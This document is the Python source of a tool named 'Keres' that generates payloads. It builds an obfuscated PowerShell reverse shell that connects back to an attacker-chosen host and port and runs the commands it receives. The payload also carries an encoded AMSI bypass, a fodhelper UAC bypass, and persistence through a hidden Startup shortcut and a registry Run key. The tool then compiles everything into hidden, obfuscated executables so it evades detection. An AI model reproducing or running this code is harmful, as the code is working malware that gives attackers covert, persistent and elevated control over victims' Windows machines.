import argparse
import colorama
import os
import subprocess
import platform
import base64
import re
import time


def display_ansi_art(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        ansi_art = file.read()
    print(ansi_art)

def create_linux(py_file):
    try:
       
        icons_directory = "icons"
        icon_file = os.path.join(icons_directory, 'keres.ico')  # Default icon file path
        is_windows = platform.system().lower() == "windows"
        python_executable = "python" if is_windows else "python3"
        if platform.system().lower() == "windows":
            raise Exception("You need to compile in a Linux environment .")
        nuitka_command = [
            python_executable, "-m", "nuitka",
            "--onefile",
            "--company-name=Keres",
            "--file-version=1.2",
            "--copyright=COPYRIGHT@Keres",
            "--trademarks=No Enemies",
            f"--windows-icon-from-ico=icons/keres.ico",
            "--disable-console",
            "--standalone",
            "--remove-output",
            f"--output-dir=Output",
            f"--output-filename=Keres",
            
            py_file
        ]
        

        try:
            
            subprocess.run(nuitka_command)
        except subprocess.CalledProcessError as e:
            print(f"Error in subprocess: {e}")

        print("Linux Executable creation process completed.")
    except Exception as e:
        print(f"An error occurred: {e}")
def create_exe(py_file):
    try:
        

        try:
            subprocess.run(["pyarmor", "cfg", "restrict_module=0"])
        except subprocess.CalledProcessError as e:
            print(f"Error in subprocess: {e}")

        try:
            subprocess.run(["pyarmor", "g", "pewpew.py"])
        except subprocess.CalledProcessError as e:
            print(f"Error in subprocess: {e}")

        try:
            py_file = './dist/pewpew.py' if os.path.exists('./dist/pewpew.py') else './pewpew.py'
            icons_directory = "icons"
            icon_file = os.path.join(icons_directory, 'keres.ico')  # Default icon file path
            is_windows = platform.system().lower() == "windows"
            python_executable = "python" if is_windows else "python3"
            if platform.system().lower() != "windows":
                raise Exception("You need to compile in a Windows environment use -Pl to specify target Platforme .")
            nuitka_command = [
                python_executable, "-m", "nuitka",
                "--onefile",
                "--company-name=Keres",
                "--file-version=1.2",
                "--copyright=COPYRIGHT@Keres",
                "--trademarks=No Enemies",
                f"--windows-icon-from-ico=icons/keres.ico",
                "--disable-console",
                "--standalone",
                "--remove-output",
                f"--output-dir=Output",
                f"--output-filename=Keres",
                "--include-package=pyarmor_runtime_000000",
                py_file
            ]
           
            subprocess.run(nuitka_command)
        except subprocess.CalledProcessError as e:
            print(f"Error in subprocess: {e}")

        print("windows Executable creation process completed check ./dist.")
    except Exception as e:
        print(f"An error occurred: {e}")
        
def encode_powershell_command(command):
    # """"""""""""""
    command_bytes = command.encode('utf-16-le')

    #" """"""""""""""""""""""""""""""""
    encoded_command = base64.b64encode(command_bytes).decode('utf-8')

    return encoded_command

def display_banner():
    banner = """
    ==========================================
     Reverse Shell Generator Payload
     Created by: BL@CK_H@T
     Version: 2.0
     Tip: usage in windows ex: python3 keres.py -a 192.168.70.42 -p 8080 -Pl Windows -Ps
    ==========================================
    """
    print(banner)

def main():
    colorama.init(autoreset=True)  # Initialize colorama for Windows
    display_banner()
    print("\n")
    parser = argparse.ArgumentParser(description="Keres=Demon")
    parser.add_argument("-a", "--address", required=True, help="Specify  address")
    parser.add_argument("-p", "--port", required=True, type=int, help="Specify  port")
    parser.add_argument("-Ps", "--save_ps_command", action="store_true", help="Save the PowerShell payload to a Keres.ps1 file in the Output folder")
    parser.add_argument("-Pl", "--platform", choices=['Linux', 'Windows'], help="Choose the targeted platform (Linux or Windows)")
    parser.add_argument("-go", "--go", action="store_true", help="build  binary from go payload")

    args = parser.parse_args()
    server_address = args.address
    port_number = args.port
    global pow

    
    ps_command = f"""
$ilinuim = $([char[]]('
',"`n",'[','R','e','F',']','.','"',"``",'A',"`$","`(",'e','c','h','o',' ','s','s','e',"`)","``",'m','B',"`$","`(",'e','c','h','o',' ','L',"`)","``",'Y','"','.','"','g',"``",'E',"`$","`(",'e','c','h','o',' ','t','t','y',"`)",'p',"``",'E','"',"`(","`(",' ','"','S','y','{{','3','}}','a','n','a','{{','1','}}','u','t','{{','4','}}','t','i','{{','2','}}','{{','0','}}','i','l','s','"',' ','-','f',"'",'i','U','t',"'",',',"'",'g','e','m','e','n','t','.','A',"'",',','"','o','n','.','A','m',"``",'s','"',',',"'",'s','t','e','m','.','M',"'",',',"'",'o','m','a',"'","`)",' ',"`)",'.','"',"`$","`(",'e','c','h','o',' ','g','e',"`)","``",'T','f',"``",'i',"`$","`(",'e','c','h','o',' ','E','l',"`)",'D','"',"`(","`(",'"','{{','0','}}','{{','2','}}','n','i','{{','1','}}','i','l','e','d','"',' ','-','f',"'",'a','m',"'",',',"'",'t','F','a',"'",',','"',"``",'s','i','I','"',"`)",',',"`(",'"','{{','2','}}','u','b','l','{{','0','}}',"``",',','{{','1','}}','{{','0','}}','"',' ','-','f',' ',"'",'i','c',"'",',',"'",'S','t','a','t',"'",',',"'",'N','o','n','P',"'","`)","`)",'.','"',"`$","`(",'e','c','h','o',' ','S','e',"`)",'t',"``",'V','a',"`$","`(",'e','c','h','o',' ','L','U','E',"`)",'"',"`(","`$","`(","`)",',',"`$","`(",'1',' ','-','e','q',' ','1',"`)","`)") -join ''); Invoke-Expression $ilinuim
$uniqueIdentifier = "Keres"
$maxProcesses = 1
$spawnedProcesses = 0

while ($true){{
    $isRunning = Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}

    if (-not $isRunning -and $spawnedProcesses -lt $maxProcesses) {{
        $connectionTest = Test-Connection -ComputerName '{server_address}' -Count 1 -Quiet

        if ($connectionTest) {{
            Start-Process $PSHOME\powershell.exe -ArgumentList {{
                $uniqueIdentifier
                $client = New-Object System.Net.Sockets.TcpClient

                try {{
                    $client.Connect('{server_address}', {port_number})
                    $stream = $client.GetStream()

                    while ($true) {{
                        if (-not $client.Connected) {{
                            Write-Host "Connection lost. Reconnecting..."
                            Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
                            break
                        }}

                        $bytes = New-Object byte[] 65535
                        $i = $stream.Read($bytes, 0, $bytes.Length)

                        if ($i -le 0) {{
                            Write-Host "Connection to server closed. Reconnecting..."
                            Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
                            break
                        }}

                        $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
                        $sendback = (iex $data 2>&1 | Out-String)
                        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
                        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
                        $stream.Write($sendbyte, 0, $sendbyte.Length)
                        $stream.Flush()
                    }}
                }} catch {{
                    Write-Host "Error: $_"
                }} finally {{
                    if ($stream) {{ $stream.Close() }}
                    if ($client) {{ $client.Close() }}
                }}
            }} -WindowStyle Hidden

            $spawnedProcesses++
        }} else {{
            Write-Host "No connection to the server. Skipping process spawn."
        }}
    }} elseif ($spawnedProcesses -ge $maxProcesses) {{
        Write-Host "Maximum number of processes reached. Skipping process spawn."
    }} else {{
        Write-Host "Script is already running."
    }}

    # Count processes after a 60-second wait
    Start-Sleep -Seconds 60
    $spawnedProcesses = (Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}).Count
}}

# UAC Bypass Code
$regPath = "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command"
$regValue = "DelegateExecute"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(Default)" -Value $command -Force
Set-ItemProperty -Path $regPath -Name $regValue -Value "" -Force
Start-Process "C:\\Windows\\System32\\fodhelper.exe"
Start-Sleep -Seconds 5
Remove-Item -Path $regPath -Recurse -Force

"""
    encoded_ps_command = encode_powershell_command(ps_command)
    if args.go and args.platform:
        with open("pewpew.go", 'r') as file:
            content = file.read()

    # Use regular expression to find and replace the encodedPSCmd line
        content = re.sub(r'encodedPSCmd := "(.*?)"', f'encodedPSCmd := "{encoded_ps_command}"', content)

        with open("pewpew.go", 'w') as file:
            file.write(content)
        if platform.system().lower() != "windows":
            if args.platform=="Windows":
                subprocess.run("export GOOS=windows GOARCH=amd64", shell=True)
                time.sleep(1)
                subprocess.run("garble -literals -tiny build  -ldflags '-s -w -H=windowsgui' -o ./Output/keres.exe pewpew.go", shell=True)
                print("Finished creating the executable in Output folder.")
            if args.platform=="Linux":

                subprocess.run("export GOOS=linux ", shell=True)
                time.sleep(1)
                subprocess.run("garble -literals -tiny build -ldflags '-s -w -H=windowsgui' -o  ./Output/keres pewpew.go", shell=True)
                print("Finished creating the executable in Output folder.")
        
        else:
            if args.platform=="Windows":
                subprocess.run("""garble  -literals -tiny build -buildmode=pie -ldflags "-s -w -H=windowsgui" -o ./Output/keres.exe pewpew.go """)
                print("Finished creating the executable in Output folder.")
            
        return
    if args.save_ps_command:
        ps_file_path = os.path.join("Output", "Keres.ps1")
        with open(ps_file_path, 'w') as ps_file:
            ps_file.write(""" 
param(
    [string]$ScriptPath =(Resolve-Path -Path $MyInvocation.MyCommand.Path),
    [string]$IconLocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe",
    [string]$HotKey = "CTRL+W",
    [string]$Description = "powershell",
    [int]$WindowStyle = 7,
    [switch]$Hidden = $true,
    [switch]$p,
    [string]$ScriptArgument = ""
)

$ilinuim = $([char[]]('
',"`n",'[','R','e','F',']','.','"',"``",'A',"`$","`(",'e','c','h','o',' ','s','s','e',"`)","``",'m','B',"`$","`(",'e','c','h','o',' ','L',"`)","``",'Y','"','.','"','g',"``",'E',"`$","`(",'e','c','h','o',' ','t','t','y',"`)",'p',"``",'E','"',"`(","`(",' ','"','S','y','{','3','}','a','n','a','{','1','}','u','t','{','4','}','t','i','{','2','}','{','0','}','i','l','s','"',' ','-','f',"'",'i','U','t',"'",',',"'",'g','e','m','e','n','t','.','A',"'",',','"','o','n','.','A','m',"``",'s','"',',',"'",'s','t','e','m','.','M',"'",',',"'",'o','m','a',"'","`)",' ',"`)",'.','"',"`$","`(",'e','c','h','o',' ','g','e',"`)","``",'T','f',"``",'i',"`$","`(",'e','c','h','o',' ','E','l',"`)",'D','"',"`(","`(",'"','{','0','}','{','2','}','n','i','{','1','}','i','l','e','d','"',' ','-','f',"'",'a','m',"'",',',"'",'t','F','a',"'",',','"',"``",'s','i','I','"',"`)",',',"`(",'"','{','2','}','u','b','l','{','0','}',"``",',','{','1','}','{','0','}','"',' ','-','f',' ',"'",'i','c',"'",',',"'",'S','t','a','t',"'",',',"'",'N','o','n','P',"'","`)","`)",'.','"',"`$","`(",'e','c','h','o',' ','S','e',"`)",'t',"``",'V','a',"`$","`(",'e','c','h','o',' ','L','U','E',"`)",'"',"`(","`$","`(","`)",',',"`$","`(",'1',' ','-','e','q',' ','1',"`)","`)") -join ''); Invoke-Expression $ilinuim
# If -p parameter is present, create the shortcut
if ($p) {
    #Define the path for the shortcut in the Startup folder
	$shortcutPath = "$([Environment]::GetFolderPath('Startup'))\Meow.lnk"
	$registryPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    Set-ItemProperty -Path $registryPath -Name Meow -Value $shortcutPath

    # Create a WScript Shell object
    $wshell = New-Object -ComObject Wscript.Shell

    # Create or modify the shortcut object
    $shortcut = $wshell.CreateShortcut($shortcutPath)

    # Set the icon location for the shortcut
    $shortcut.IconLocation = $IconLocation

    # Set the target path and arguments for the shortcut
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $ScriptPath "

    # Set the working directory for the shortcut
    $shortcut.WorkingDirectory = (Get-Item $ScriptPath).DirectoryName

    # Set a hotkey for the shortcut
    $shortcut.HotKey = $HotKey

    # Set a description for the shortcut
    $shortcut.Description = $Description

    # Set the window style for the shortcut
    $shortcut.WindowStyle = $WindowStyle

    # Save the shortcut
    $shortcut.Save()

    # Optionally set the 'Hidden' attribute
    if ($Hidden) {
        [System.IO.File]::SetAttributes($shortcutPath, [System.IO.FileAttributes]::Hidden)
    }
}\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand """+encoded_ps_command)
        print('\n')
        print('generated  Powershell payload')
        print("\nGenerated PowerShell command\n")

    new_python_script = f"""
import subprocess

powershell_script = r'''
$command = 'powershell.exe -nop -w hidden -enc {encoded_ps_command}'
$regPath = "HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command"
$regValue = "DelegateExecute"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name '(Default)' -Value $command -Force
Set-ItemProperty -Path $regPath -Name $regValue -Value '' -Force
Start-Process "C:\\\\Windows\\\\System32\\\\fodhelper.exe"
Start-Sleep -Seconds 5
Remove-Item -Path $regPath -Recurse -Force
'''

with open("temp_script.ps1", "w") as file:
    file.write(powershell_script)

# Execute the PowerShell script using subprocess with -ExecutionPolicy Bypass
subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", "temp_script.ps1"], check=True)
"""

        # Write the new Python script to a file
    script_filename = input("Please enter the script .py name (ex:payload.py): ")

    with open(script_filename, "w") as file:
        file.write(new_python_script)

        print(f"The new Python script '{script_filename}' has been created successfully.")

        convert_to_exe = input("Do you want to convert the script to an executable (.exe) automatically? (yes/no): ").strip().lower()

    if convert_to_exe == 'yes':
        # Run PyInstaller to convert the script to an executable
        print("Converting the script to an executable...")
        # make sure to give the right path where you installed your pyinstaller
        pyinstaller_path = r"C:\Users\Gabriel\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\LocalCache\local-packages\Python312\Scripts\pyinstaller.exe"
        result = subprocess.run([pyinstaller_path, "--onefile", "--windowed", script_filename], capture_output=True, text=True)

        if result.returncode == 0:
            print("The script has been successfully converted to an executable.")
        else:
            print("Failed to convert the script to an executable. Please ensure PyInstaller is installed and try again.")
            print("PyInstaller output:", result.stdout, result.stderr)
    else:
        print("Please convert the script to an executable manually if needed.")
        return

        #print(encoded_ps_command)
    

if __name__ == "__main__":
    main()